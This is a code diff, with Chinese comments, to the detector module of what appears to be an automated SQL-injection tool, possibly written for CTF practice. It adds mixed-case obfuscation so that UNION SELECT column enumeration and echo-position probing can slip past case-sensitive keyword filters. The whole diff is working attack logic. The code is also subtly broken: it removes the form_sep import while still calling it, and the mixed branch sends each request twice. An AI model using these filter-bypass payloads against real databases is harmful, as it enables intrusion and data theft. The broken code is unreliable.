@@ -310,12 +310,13 @@ class Detector:
 
     def _columns_by_union_enum(self, inj: InjectionPoint):
         """UNION 列数枚举：n=1..15，每列放独立 marker，页面出现即命中。
-        marker 双形式：引号版（默认）失败后自动换十六进制版（单引号被滤时）。"""
-        from ..tampers import form_sep, to_hex_literal
+        marker 双形式：引号版（默认）失败后自动换十六进制版（单引号被滤时）；
+        再失败尝试大小写混淆（select 被大小写敏感过滤时，c.f. web176）。"""
+        from ..tampers import apply_form, mixed_case, to_hex_literal
         pre = f"0{inj.closure}" if not inj.numeric else "0"
         if not inj.closure:
             pre += form_sep(inj.form) if inj.form != "classic" else " "
-        for literal in ("quote", "hex"):
+        for literal in ("quote", "hex", "mixed"):
             for n in range(1, 16):
                 if self.s.stopped:
                     return
@@ -325,6 +326,8 @@ class Detector:
                 else:
                     cols = ",".join(to_hex_literal(m) for m in markers)
                 payload = f"{pre}{apply_form(f'union select {cols}', inj.form)}{inj.comment}"
+                if literal == "mixed":
+                    payload = mixed_case(payload)
                 r = self._send(payload)
                 # 报错页会把 payload 原文回显在 near '...' 中，必须排除
                 if r.status_code > 0 and not r.has_sql_error():
@@ -344,14 +347,17 @@ class Detector:
         return [f"{MARKER_PREFIX}{chr(97 + i % 26) * 3}" for i in range(n)]
 
     def _find_echo_positions(self, inj: InjectionPoint):
-        from ..tampers import to_hex_literal
+        from ..tampers import mixed_case, to_hex_literal
         markers = self._echo_markers(inj.column_count)
-        for lit in ("quote", "hex"):
+        for lit in ("quote", "hex", "mixed"):
             if lit == "quote":
                 cols = ",".join(f"'{m}'" for m in markers)
             else:
                 cols = ",".join(to_hex_literal(m) for m in markers)
             r = self._send(f"0{inj.closure} union select {cols}{inj.comment}")
+            if lit == "mixed":
+                r = self._send(mixed_case(
+                    f"0{inj.closure} union select {cols}{inj.comment}"))
             # 报错页会把 payload 原文回显在 near '...' 中，必须排除
             if r.status_code > 0 and not r.has_sql_error():
                 pos = [i + 1 for i, m in enumerate(markers) if m in r.body]
